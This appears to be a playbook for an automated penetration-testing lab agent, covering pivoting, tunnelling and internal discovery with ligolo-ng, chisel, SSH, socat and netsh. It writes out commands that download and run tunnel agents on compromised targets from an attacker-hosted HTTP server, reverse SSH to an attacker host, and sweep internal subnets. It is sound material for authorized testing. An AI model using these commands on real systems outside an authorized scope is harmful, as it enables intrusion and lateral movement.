# Pivoting and port forwarding

Reach services bound to `127.0.0.1` on a target, or hosts behind it. On a single
box this is an occasional trick; on a multi-host lab it is the load-bearing
infrastructure — most of the network is unreachable until a tunnel exists, and a
tunnel that died without you noticing looks exactly like a target with nothing
open.

**Register every tunnel in the campaign state** (`pwnloop route add …`) with a
canary, so `pwnloop route check` can prove it still carries traffic.

## Picking a mechanism

| situation | use | why |
|---|---|---|
| you have SSH credentials | ssh `-D`/`-L` | nothing to upload |
| any shell, need a whole subnet | **ligolo-ng** | real TUN route: `-sS`, UDP, raw tools all work |
| any shell, one or two ports | chisel | smallest moving part |
| no upload possible, one port | socat / ssh `-R` | uses what is already there |

Default to **ligolo-ng**. A SOCKS proxy silently degrades your tooling —
`proxychains` only carries TCP connect, so SYN scans, UDP, ICMP and most binary
protocol tooling either fail or lie. Reading "no ports open" through a SOCKS
proxy is one of the most expensive mistakes available on a lab.

## ligolo-ng (preferred)

Proxy runs in the container, agents run on targets. All staged:
`/opt/static/ligolo-proxy`, `/opt/static/ligolo-agent` (linux amd64) and
`/opt/static/windows/ligolo-agent.exe`.

```bash
# 1. once per container boot: create the interface
pwnloop x "ip tuntap add user root mode tun ligolo; ip link set ligolo up"

# 2. start the proxy, backgrounded so it survives your context
pwnloop x "tmux new -d -s ligolo '/opt/static/ligolo-proxy -selfcert -laddr 0.0.0.0:11601'"

# 3. deliver the agent (see the delivery section below) and run it on the target
#    linux:    ./ligolo-agent -connect <tun0-ip>:11601 -ignore-cert &
#    windows:  Start-Process -NoNewWindow ligolo-agent.exe "-connect <tun0-ip>:11601 -ignore-cert"

# 4. in the proxy console: session -> pick the agent -> start
#    then route the target's subnet down the tunnel
pwnloop x "ip route add 172.16.1.0/24 dev ligolo"

# 5. tell the campaign about it
pwnloop route add subnet=172.16.1.0/24 via=10.10.110.100 type=ligolo \
                  listener=11601 canary=172.16.1.5:445
```

**The route goes in after the session is started**, never before. The interface
exists from step 1 but carries nothing until a session is running, so a route
added early blackholes the traffic and the subnet reads as filtered — a failure
that looks like a hardened target rather than a mistake in your own setup.

Drive the proxy console non-interactively by sending keys to the tmux session:

```bash
pwnloop x "tmux send-keys -t ligolo 'session' Enter '1' Enter 'start' Enter"
pwnloop x "tmux capture-pane -pt ligolo | tail -20"     # read what it said
```

**Double pivot** (a host reachable only through the first pivot): run a second
agent on the second host, connecting not to your `tun0` but to a *listener the
first agent exposes*. In the proxy console, on the first session:

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

The second agent then connects to `<first-host-ip>:11601`, and you add a second
`ligolo` interface (`ligolo2`) with its own route. Register both routes; set the
second one's `via` to the first host so the dependency is visible when one dies.

## chisel

Staged for linux (amd64/arm64) and windows in `/opt/static`.

```bash
pwnloop x "tmux new -d -s chisel '/opt/static/chisel_1.10.1_linux_arm64 server -p 9000 --reverse'"
# target
./chisel client <tun0-ip>:9000 R:socks                  # SOCKS5 on 127.0.0.1:1080
./chisel client <tun0-ip>:9000 R:8080:127.0.0.1:8080    # single port
chisel.exe client <tun0-ip>:9000 R:socks
```

## SSH tunnels

```bash
pwnloop x "ssh -i key -L 8080:127.0.0.1:8080 user@$T -N -f"   # one local port
pwnloop x "ssh -i key -D 1080 user@$T -N -f"                  # SOCKS
ssh -R 4444:127.0.0.1:4444 user@attacker                      # expose your listener inward
```

`sshuttle` turns SSH access into a route without any agent — the cheapest full
subnet pivot when you have credentials:

```bash
pwnloop x "sshuttle -r user@$T 172.16.1.0/24 --ssh-cmd 'ssh -i /engagements/…/loot/id_rsa'"
```

## socat / no-upload fallbacks

```bash
./socat TCP-LISTEN:9001,fork,reuseaddr TCP:172.16.1.5:445    # on the target
# bash-only, one shot
exec 3<>/dev/tcp/172.16.1.5/445
```

Windows without an upload: `netsh interface portproxy add v4tov4 listenport=9001
connectaddress=172.16.1.5 connectport=445` (needs admin, and remember to delete
it during cleanup).

## Delivering the agent

```bash
# serve from the engagement's www/ over the tunnel you already have
pwnloop x "cd /campaigns/$LAB/hosts/$IP/www && tmux new -d -s http 'python3 -m http.server 8000'"
# linux target
curl http://<tun0-ip>:8000/ligolo-agent -o /tmp/.a && chmod +x /tmp/.a
wget -q http://<tun0-ip>:8000/ligolo-agent -O /tmp/.a    # no curl
# windows target
certutil -urlcache -split -f http://<tun0-ip>:8000/ligolo-agent.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<tun0-ip>:8000/ligolo-agent.exe -OutFile $env:TEMP\a.exe"
# no outbound HTTP: push it over SMB from an already-owned host, or base64 it in
```

Track every uploaded agent in the ledger's artifacts list — they are the first
thing cleanup removes.

## Using a SOCKS proxy when you must

```bash
pwnloop x "proxychains4 -q nmap -sT -Pn -n 172.16.1.5"
pwnloop x "proxychains4 -q nxc smb 172.16.1.0/24"
```
`/etc/proxychains4.conf` → `socks5 127.0.0.1 1080`. Only TCP connect works.
`-sS`, UDP and ICMP do not — if a scan through a proxy says "nothing open",
re-check through a TUN route before believing it.

## Bulk transfer does not belong in the tunnel

A SOCKS proxy or in-band C2 tunnel is for control traffic. Large transfers over
one — signed SMB writes especially — corrupt or stall, and the symptom reads as
a broken technique rather than a broken transport.

Stage the file on a host you already own *inside* the target segment, share it
there, and have the target pull it over the internal network at full speed;
route only the small operations through the proxy. Reverse the same shape for
pulling a large dump out.

## Discovery from inside

The moment you own a host, mine it for the next subnet:

```bash
ip route; ip -4 addr; arp -a; cat /etc/resolv.conf         # linux
route print; ipconfig /all; arp -a; netstat -ano           # windows
```

Then sweep the new range from the target itself (faster and stealthier than
scanning through a half-built tunnel):

```bash
for i in $(seq 1 254); do (ping -c1 -W1 172.16.1.$i | grep -q ttl && echo 172.16.1.$i &); done
for p in 22 80 445 3389 5985; do (echo > /dev/tcp/172.16.1.5/$p) 2>/dev/null && echo "open $p"; done
```
PowerShell equivalent: `1..254 | % { Test-Connection -Count 1 -Quiet 172.16.1.$_ }`.

Record what you find with `pwnloop host add` and `pwnloop lead add kind=subnet`
before you start exploring it — discovery that only exists in your context is
lost at the next reset.

## When a tunnel dies

Labs reset; VPNs drop; agents get killed by a reboot. Symptoms are
indistinguishable from a hardened target: timeouts, "host down", a scan returning
nothing where it used to return ports.

```bash
pwnloop vpn-status                 # always check this first
pwnloop route check                # canaries tell you which tunnels are real
pwnloop x "ip route | grep ligolo" # the interface can survive while the agent is gone
pwnloop x "tmux capture-pane -pt ligolo | tail -20"
```

Recovery order: VPN → proxy process → agent on the target (re-deliver and re-run)
→ session `start` in the console → `ip route add` → `route check` to confirm.
Only then go back to whatever you were doing. Debugging a target through a dead
tunnel is the single most common way to waste an hour on a campaign.

Keep pivoting inside the lab. A route whose next hop leaves the lab's ranges is a
scope question — stop and ask.
